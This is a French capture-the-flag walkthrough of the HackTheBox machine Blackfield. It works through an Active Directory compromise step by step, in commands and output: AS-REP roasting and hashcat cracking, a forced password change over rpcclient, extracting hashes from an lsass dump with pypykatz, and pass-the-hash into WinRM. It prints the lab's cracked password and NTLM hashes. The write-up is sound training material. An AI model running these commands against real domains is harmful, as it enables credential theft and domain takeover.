Backfield est une machine Windows considee comme Hard qui présente des erreurs de configuration de Windows et d'Active Directory. L'accès anonyme / invité à un partage SMB est utilisé pour énumérer les utilisateurs. Il s'avère qu'un utilisateur a désactivé la préauthentification Kerberos, ce qui nous permet de mener une attaque de type `ASREPRoasting`. Cela nous permet de récupérer un hachage du matériel crypté contenu dans l'AS-REP, qui peut être soumis à une attaque par force brute hors ligne afin de récupérer le mot de passe en clair. Avec cet utilisateur, nous pouvons accéder à un partage SMB contenant des artefacts Forensic, y compris un vidage de processus lsass. Celui-ci contient le nom d'utilisateur et le mot de passe d'un utilisateur disposant de privilèges WinRM, qui est également membre du groupe Backup Operators. Les privilèges conférés par ce groupe privilégié sont utilisés pour vidanger la base de données Active Directory et récupérer le hash de l'administrateur principal du domaine.


## Recon
Pour commencer je vais lancer mon scan nmap et voir ce que ca peux donner
```
└─# /home/blo/tools/nmapautomate/nmapauto.sh $ip

###############################################
###---------) Starting Quick Scan (---------###
###############################################


Nmap scan report for 10.129.229.17
Host is up (0.28s latency).
Not shown: 993 filtered tcp ports (no-response)
PORT     STATE SERVICE
53/tcp   open  domain
88/tcp   open  kerberos-sec
135/tcp  open  msrpc
389/tcp  open  ldap
445/tcp  open  microsoft-ds
593/tcp  open  http-rpc-epmap
3268/tcp open  globalcatLDAP

Read data files from: /usr/bin/../share/nmap
Nmap done: 1 IP address (1 host up) scanned in 21.41 seconds
           Raw packets sent: 2008 (88.328KB) | Rcvd: 19 (820B)


----------------------------------------------------------------------------------------------------------
Open Ports : 53,88,135,389,445,593,3268
----------------------------------------------------------------------------------------------------------
└─# nc -nv $ip 5985        
(UNKNOWN) [10.129.229.17] 5985 (?) open

# nmap -sV -Pn -p53,88,135,389,445,593,3268 $ip         
Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-03-05 18:06 CST
Nmap scan report for 10.129.229.17
Host is up (0.43s latency).

PORT     STATE SERVICE       VERSION
53/tcp   open  domain        Simple DNS Plus
88/tcp   open  kerberos-sec  Microsoft Windows Kerberos (server time: 2024-03-06 07:06:56Z)
135/tcp  open  msrpc         Microsoft Windows RPC
389/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: BLACKFIELD.local0., Site: Default-First-Site-Name)
445/tcp  open  microsoft-ds?
593/tcp  open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
3268/tcp open  ldap          Microsoft Windows Active Directory LDAP (Domain: BLACKFIELD.local0., Site: Default-First-Site-Name)
Service Info: Host: DC01; OS: Windows; CPE: cpe:/o:microsoft:windows
```

Je suis dans un Active Directory avec le domain `BLACKFIELD.local` et le DC `DC01.BLACKFIELD.local`

- SMB ouvert
- MSRPC ouvert
- WINRM ouvert
- kerberoas ouvert

```
─# nxc smb $ip -u '' -p '' --shares
SMB         10.129.229.17   445    DC01             [*] Windows 10.0 Build 17763 x64 (name:DC01) (domain:BLACKFIELD.local) (signing:True) (SMBv1:False)
SMB         10.129.229.17   445    DC01             [+] BLACKFIELD.local\: 
SMB         10.129.229.17   445    DC01             [-] Error enumerating shares: STATUS_ACCESS_DENIED
                                                                                                                                                                                             
┌──(root㉿xXxX)-[/home/blo/Github/RED-TEAM/Win_Boxes]
└─# nxc smb $ip -u 'anyuser' -p '' --shares
SMB         10.129.229.17   445    DC01             [*] Windows 10.0 Build 17763 x64 (name:DC01) (domain:BLACKFIELD.local) (signing:True) (SMBv1:False)
SMB         10.129.229.17   445    DC01             [+] BLACKFIELD.local\anyuser: 

```

Un utilisateur anonyme est deja configure dans le system, alors quoi faire ?
je vais utiliser `smbclient`

```
└─# smbclient -N -L //BLACKFIELD.local/                     

        Sharename       Type      Comment
        ---------       ----      -------
        ADMIN$          Disk      Remote Admin
        C$              Disk      Default share
        forensic        Disk      Forensic / Audit share.
        IPC$            IPC       Remote IPC
        NETLOGON        Disk      Logon server share 
        profiles$       Disk      
        SYSVOL          Disk      Logon server share 
tstream_smbXcli_np_destructor: cli_close failed on pipe srvsvc. Error was NT_STATUS_IO_TIMEOUT
Reconnecting with SMB1 for workgroup listing.
do_connect: Connection to BLACKFIELD.local failed (Error NT_STATUS_IO_TIMEOUT)
Unable to connect with SMB1 -- no workgroup available
                                                                     
```

dans le profiles$ je trouve plusieurs utilisateurs
```

└─# cat users | awk '{print $1}' | tee user

```

Alors que j'ai des utilisateurs je vais voir s'ils ont des comptes Kerberoas

```
└─# kerbrute userenum --dc $ip -d BLACKFIELD.local user

    __             __               __     
   / /_____  _____/ /_  _______  __/ /____ 
  / //_/ _ \/ ___/ __ \/ ___/ / / / __/ _ \
 / ,< /  __/ /  / /_/ / /  / /_/ / /_/  __/
/_/|_|\___/_/  /_.___/_/   \__,_/\__/\___/                                        

Version: v1.0.3 (9dad6e1) - 03/05/24 - Ronnie Flathers @ropnop

2024/03/05 18:38:29 >  Using KDC(s):
2024/03/05 18:38:29 >   10.129.229.17:88

2024/03/05 18:38:38 >  [+] VALID USERNAME:       audit2020@BLACKFIELD.local
2024/03/05 18:41:25 >  [+] VALID USERNAME:       svc_backup@BLACKFIELD.local
2024/03/05 18:41:25 >  [+] VALID USERNAME:       support@BLACKFIELD.local
2024/03/05 18:42:06 >  Done! Tested 283 usernames (3 valid) in 217.214 seconds
                                                                                    
```
Je viens de trouver 3 users, alors je vais voir le `ASREPRoasting`

```
└─# impacket-GetNPUsers BLACKFIELD.local/ -no-pass -usersfile user -request
Impacket v0.12.0.dev1+20231114.165227.4b56c18a - Copyright 2023 Fortra

[-] User audit2020 doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] User svc_backup doesn't have UF_DONT_REQUIRE_PREAUTH set
$krb5asrep$23$support@BLACKFIELD.LOCAL:941fbb97293c47f137820d2d2ef0484a$b2b2de0269f8beb3a0be1efd86ce00c4992d9492a93b116e1e6d73ad1160a660e6022b9a38f3db3b2633f55b7f84088ed6079a3582c7eb53d970e8aaea022986676f3528a1fe3004d513afaf6f12b046a7c6b732d1bfb22c9dd567d507e07951d79561d0d51396e00ff6fb8126b059171f0560880de9e879947b63772b6e4a9ae809ebc93e46230a2259e36d489b4c62c7eabfbe272496b90f3f6bdd0959a52aa42bc51dd9d35c4d2b553dd0bdb762f434b741752d1e2bce909e97bf8909e59781436428d73ff55777f8a2bba4c2b11a9d56d838515b20c2f7921de84d7f290d8bdfef632009abd74020c9983f14762542ab9a46
                                                 
```
Je vais le cracker avec hashcat

```
└─# hashcat -a 0 -m 18200 hash.txt /usr/share/wordlists/rockyou.txt 
* Create more work items to make use of your parallelization power:
  https://hashcat.net/faq/morework

$krb5asrep$23$support@BLACKFIELD.LOCAL:941fbb97293c47f137820d2d2ef0484a$b2b2de0269f8beb3a0be1efd86ce00c4992d9492a93b116e1e6d73ad1160a660e6022b9a38f3db3b2633f55b7f84088ed6079a3582c7eb53d970e8aaea022986676f3528a1fe3004d513afaf6f12b046a7c6b732d1bfb22c9dd567d507e07951d79561d0d51396e00ff6fb8126b059171f0560880de9e879947b63772b6e4a9ae809ebc93e46230a2259e36d489b4c62c7eabfbe272496b90f3f6bdd0959a52aa42bc51dd9d35c4d2b553dd0bdb762f434b741752d1e2bce909e97bf8909e59781436428d73ff55777f8a2bba4c2b11a9d56d838515b20c2f7921de84d7f290d8bdfef632009abd74020c9983f14762542ab9a46:#00^BlackKnight
                                                          
Session..........: hashcat
Status...........: Cracked
Hash.Mode........: 18200 (Kerberos 5, etype 23, AS-REP)
Hash.Target......: $krb5asrep$23$support@BLACKFIELD.LOCAL:941fbb97293c...ab9a46
Time.Started.....: Tue Mar  5 18:46:03 2024 (8 secs)
Time.Estimated...: Tue Mar  5 18:46:11 2024 (0 secs)
Kernel.Feature...: Pure Kernel
Guess.Base.......: File (/usr/share/wordlists/rockyou.txt)
Guess.Queue......: 1/1 (100.00%)
Speed.#1.........:  1722.9 kH/s (1.09ms) @ Accel:512 Loops:1 Thr:1 Vec:8
Recovered........: 1/1 (100.00%) Digests (total), 1/1 (100.00%) Digests (new)
Progress.........: 14336000/14344387 (99.94%)
Rejected.........: 0/14336000 (0.00%)
Restore.Point....: 14331904/14344387 (99.91%)
Restore.Sub.#1...: Salt:0 Amplifier:0-1 Iteration:0-1
Candidate.Engine.: Device Generator
Candidates.#1....: #1tray -> #!kayla
Hardware.Mon.#1..: Temp: 43c Util: 60%

Started: Tue Mar  5 18:46:02 2024
Stopped: Tue Mar  5 18:46:13 2024
```

Je vais verifier avec `winrm` comme elle est deja ouvert mais ca ne marche pas
alors je vaos essayer

```

└─# nxc smb 10.129.229.17 -u support -p '#00^BlackKnight' --shares   
SMB         10.129.229.17   445    DC01             [*] Windows 10.0 Build 17763 x64 (name:DC01) (domain:BLACKFIELD.local) (signing:True) (SMBv1:False)
SMB         10.129.229.17   445    DC01             [+] BLACKFIELD.local\support:#00^BlackKnight 
SMB         10.129.229.17   445    DC01             [*] Enumerated shares
SMB         10.129.229.17   445    DC01             Share           Permissions     Remark
SMB         10.129.229.17   445    DC01             -----           -----------     ------
SMB         10.129.229.17   445    DC01             ADMIN$                          Remote Admin
SMB         10.129.229.17   445    DC01             C$                              Default share
SMB         10.129.229.17   445    DC01             forensic                        Forensic / Audit share.
SMB         10.129.229.17   445    DC01             IPC$            READ            Remote IPC
SMB         10.129.229.17   445    DC01             NETLOGON        READ            Logon server share 
SMB         10.129.229.17   445    DC01             profiles$       READ            
SMB         10.129.229.17   445    DC01             SYSVOL          READ            Logon server share 
                                                                                                          
```

J'ai pas beaucoun d'infos alors je vais checker le `rpcclient` pour voir d'autres utilisateurs existant

```
└─# rpcclient -U 'support%#00^BlackKnight' 10.129.229.17 -c 'enumdomusers' | grep -oP '\[.*?\]' | grep -v '0x' | tr -d '[]'
svc_backup
lydericlefebvre
audit2020
support
Administrator
```
Avec ces utilisateurs quoi faire ?
Comme j'ai un utilisateurs et un mot de passe, alors je vais faire du password spray

```


```

Mais ca ne marche pas, alors je vais utiliser bloodhound pour voir si j'ai le meilleur pour avoir le root

```
─# bloodhound-python -d BLACKFIELD.local -u support -p '#00^BlackKnight' -ns 10.129.229.17 -c All
INFO: Found AD domain: blackfield.local
INFO: Getting TGT for user
INFO: Connecting to LDAP server: dc01.blackfield.local
INFO: Kerberos auth to LDAP failed, trying NTLM
INFO: Found 1 domains
INFO: Found 1 domains in the forest
INFO: Found 18 computers
INFO: Connecting to LDAP server: dc01.blackfield.local
INFO: Kerberos auth to LDAP failed, trying NTLM
INFO: Found 316 users
INFO: Found 52 groups
INFO: Found 2 gpos
INFO: Found 1 ous
INFO: Found 19 containers
INFO: Found 0 trusts
INFO: Starting computer enumeration with 10 workers
INFO: Querying computer: 
INFO: Querying computer: 
INFO: Querying computer: 
INFO: Querying computer: 
INFO: Querying computer: 
INFO: Querying computer: 
INFO: Querying computer: 
INFO: Querying computer: 
INFO: Querying computer: 
INFO: Querying computer: 
INFO: Querying computer: 
INFO: Querying computer: 
INFO: Querying computer: 
INFO: Querying computer: 
INFO: Querying computer: 
INFO: Querying computer: 
INFO: Querying computer: 
INFO: Querying computer: DC01.BLACKFIELD.local
INFO: Done in 06M 56S

```

Dans le Bloodhound et `Node Info` je clique sur `First Degree Object control` puis je trouve que l'utilisateur `support` peux `ForceChangePassword` de l'utilisateur `audit2020`

*The user SUPPORT@BLACKFIELD.LOCAL has the capability to change the user AUDIT2020@BLACKFIELD.LOCAL's password without knowing that user's current password.*

- https://www.thehacker.recipes/ad/movement/dacl/forcechangepassword

**ForceChangePassword**

Pour cet attaque je vais utiliser `rpcclient` pour modifier le mot de passe sans meme connaitre son mot de passe avec l'option `setuserinfo2`

```
rpcclient $> setuserinfo2 
Usage: setuserinfo2 username level password [password_expired]
result was NT_STATUS_INVALID_PARAMETER
rpcclient $> setuserinfo2 audit2020 23 Password1
rpcclient $> 

┌──(root㉿xXxX)-[/home/…/CTFs/Boot2root/HTB/bloodhound]
└─# impacket-psexec BLACKFIELD.local/audit2020:Password1@10.129.229.17
Impacket v0.12.0.dev1+20231114.165227.4b56c18a - Copyright 2023 Fortra

[*] Requesting shares on 10.129.229.17.....
[-] share 'ADMIN$' is not writable.
[-] share 'C$' is not writable.
[-] share 'forensic' is not writable.
[-] share 'NETLOGON' is not writable.
[-] share 'profiles$' is not writable.
[-] share 'SYSVOL' is not writable.

```
Je vais essayer smbclient avec cet utilisateurs

```
┌──(root㉿xXxX)-[/home/…/CTFs/Boot2root/HTB/bloodhound]
└─# smbclient -L //BLACKFIELD.local/ -U 'audit2020%Password1'

        Sharename       Type      Comment
        ---------       ----      -------
        ADMIN$          Disk      Remote Admin
        C$              Disk      Default share
        forensic        Disk      Forensic / Audit share.
        IPC$            IPC       Remote IPC
        NETLOGON        Disk      Logon server share 
        profiles$       Disk      
        SYSVOL          Disk      Logon server share 
tstream_smbXcli_np_destructor: cli_close failed on pipe srvsvc. Error was NT_STATUS_IO_TIMEOUT
Reconnecting with SMB1 for workgroup listing.
```

Et si j'essaye ici d'acceder au repertoire forensic

```
└─# smbclient  //BLACKFIELD.local/forensic -U 'audit2020%Password1'
Try "help" to get a list of possible commands.
smb: \> dir
  .                                   D        0  Sun Feb 23 07:03:16 2020
  ..                                  D        0  Sun Feb 23 07:03:16 2020
  commands_output                     D        0  Sun Feb 23 12:14:37 2020
  memory_analysis                     D        0  Thu May 28 15:28:33 2020
  tools                               D        0  Sun Feb 23 07:39:08 2020
smb: \memory_analysis\> dir
  .                                   D        0  Thu May 28 15:28:33 2020
  ..                                  D        0  Thu May 28 15:28:33 2020
  conhost.zip                         A 37876530  Thu May 28 15:25:36 2020
  ctfmon.zip                          A 24962333  Thu May 28 15:25:45 2020
  dfsrs.zip                           A 23993305  Thu May 28 15:25:54 2020
  dllhost.zip                         A 18366396  Thu May 28 15:26:04 2020
  ismserv.zip                         A  8810157  Thu May 28 15:26:13 2020
  lsass.zip                           A 41936098  Thu May 28 15:25:08 2020
  mmc.zip                             A 64288607  Thu May 28 15:25:25 2020
  RuntimeBroker.zip                   A 13332174  Thu May 28 15:26:24 2020
  ServerManager.zip                   A 131983313  Thu May 28 15:26:49 2020
  sihost.zip                          A 33141744  Thu May 28 15:27:00 2020
  smartscreen.zip                     A 33756344  Thu May 28 15:27:11 2020
  svchost.zip                         A 14408833  Thu May 28 15:27:19 2020
  taskhostw.zip                       A 34631412  Thu May 28 15:27:30 2020
  winlogon.zip                        A 14255089  Thu May 28 15:27:38 2020
  wlms.zip                            A  4067425  Thu May 28 15:27:44 2020
  WmiPrvSE.zip                        A 18303252  Thu May 28 15:27:53 2020

                5102079 blocks of size 4096. 1691294 blocks available
smb: \memory_analysis\> 
```

Je trouve un `lsass.zip`
Le fichier est large que je peux pas le telecharger dans le SMB, alors je vais mount ce share

```
└─# mount.cifs //BLACKFIELD.local/forensic mnt -o user=audit2020
Password for audit2020@//BLACKFIELD.local/forensic: 
                                                                                             
┌──(root㉿xXxX)-[/home/blo/CTFs/Boot2root/HTB]
└─# ls mnt                                   
 commands_output   memory_analysis   tools

lsass.DMP
```


Je trouve un `lsass.DMP` alors au lieu d'utiliser `mimikatz` je vais plutot utiliser `pypykatz` pour extraire toutes les hash dans ce dump

```
SID               : S-1-5-21-4194615774-2175524697-3563712290-1413
        msv :
         [00000003] Primary
         * Username : svc_backup
         * Domain   : BLACKFIELD
         * NTLM     : 9658d1d1dcd9250115e2205d9f48400d
         * SHA1     : 463c13a9a31fc3252c68ba0a44f0221626a33e5c
         * DPAPI    : a03cd8e9d30171f3cfe8caad92fef621
        tspkg :
        wdigest :
         * Username : svc_backup
         * Domain   : BLACKFIELD
         * Password : (null)
        kerberos :
         * Username : svc_backup
         * Domain   : BLACKFIELD.LOCAL
         * Password : (null)
        ssp :
        credman :

Authentication Id : 0 ; 153705 (00000000:00025869)
Session           : Interactive from 1
User Name         : Administrator
Domain            : BLACKFIELD
Logon Server      : DC01
Logon Time        : 23-02-2020 23:29:04
SID               : S-1-5-21-4194615774-2175524697-3563712290-500
        msv :
         [00000003] Primary
         * Username : Administrator
         * Domain   : BLACKFIELD
         * NTLM     : 7f1e4ff8c6a8e6b6fcae2d9c0572cd62
         * SHA1     : db5c89a961644f0978b4b69a4d2a2239d7886368
         * DPAPI    : 240339f898b6ac4ce3f34702e4a89550
        tspkg :
        wdigest :
         * Username : Administrator
         * Domain   : BLACKFIELD
         * Password : (null)
        kerberos :
         * Username : Administrator
         * Domain   : BLACKFIELD.LOCAL
         * Password : (null)
        ssp :
        credman :


```

## Pass-The-Hash
```
└─# nxc smb BLACKFIELD.local -u 'svc_backup' -H '9658d1d1dcd9250115e2205d9f48400d' 
SMB         10.129.229.17   445    DC01             [*] Windows 10.0 Build 17763 x64 (name:DC01) (domain:BLACKFIELD.local) (signing:True) (SMBv1:False)
SMB         10.129.229.17   445    DC01             [+] BLACKFIELD.local\svc_backup:9658d1d1dcd9250115e2205d9f48400d
```

Je vais essayer le `winrm`

```

┌──(root㉿xXxX)-[/home/blo/CTFs/Boot2root/HTB]
└─# evil-winrm -i $ip -u svc_backup -H 9658d1d1dcd9250115e2205d9f48400d
                                        
Evil-WinRM shell v3.5
                                        
Warning: Remote path completions is disabled due to ruby limitation: quoting_detection_proc() function is unimplemented on this machine                                                             
                                        
Data: For more information, check Evil-WinRM GitHub: https://github.com/Hackplayers/evil-winrm#Remote-path-completion                                                                               
                                        
Info: Establishing connection to remote endpoint
*Evil-WinRM* PS C:\Users\svc_backup\Documents> *Evil-WinRM* PS C:\Users\svc_backup\desktop> type user.txt
3920bb317a0bef51027e2852be64b543

```


## escalation
```
*Evil-WinRM* PS C:\Users\svc_backup\desktop> whoami /priv

PRIVILEGES INFORMATION
----------------------

Privilege Name                Description                    State
============================= ============================== =======
SeMachineAccountPrivilege     Add workstations to domain     Enabled
SeBackupPrivilege             Back up files and directories  Enabled
SeRestorePrivilege            Restore files and directories  Enabled
SeShutdownPrivilege           Shut down the system           Enabled
SeChangeNotifyPrivilege       Bypass traverse checking       Enabled
SeIncreaseWorkingSetPrivilege Increase a process working set Enabled
*Evil-WinRM* PS C:\Users\svc_backup\desktop> 
```

ici je crois que a travers le `SeBackupPrivilege` je peux avoir le root en uploading un malicious DLL et en lisant des fichiers
Mais en regardant dans les groupes 

```
*Evil-WinRM* PS C:\Users\svc_backup\desktop> whoami /groups

GROUP INFORMATION
-----------------

Group Name                                 Type             SID          Attributes
========================================== ================ ============ ==================================================
Everyone                                   Well-known group S-1-1-0      Mandatory group, Enabled by default, Enabled group
BUILTIN\Backup Operators                   Alias            S-1-5-32-551 Mandatory group, Enabled by default, Enabled group
BUILTIN\Remote Management Users            Alias            S-1-5-32-580 Mandatory group, Enabled by default, Enabled group
BUILTIN\Users                              Alias            S-1-5-32-545 Mandatory group, Enabled by default, Enabled group
BUILTIN\Pre-Windows 2000 Compatible Access Alias            S-1-5-32-554 Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\NETWORK                       Well-known group S-1-5-2      Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\Authenticated Users           Well-known group S-1-5-11     Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\This Organization             Well-known group S-1-5-15     Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\NTLM Authentication           Well-known group S-1-5-64-10  Mandatory group, Enabled by default, Enabled group
Mandatory Label\High Mandatory Level       Label            S-1-16-12288
*Evil-WinRM* PS C:\Users\svc_backup\desktop> 
```

Je vois que je suis dans le groupe des operateurs de backup alors je peux utiliser `secretsdump` pour dump les hash des utilisateurs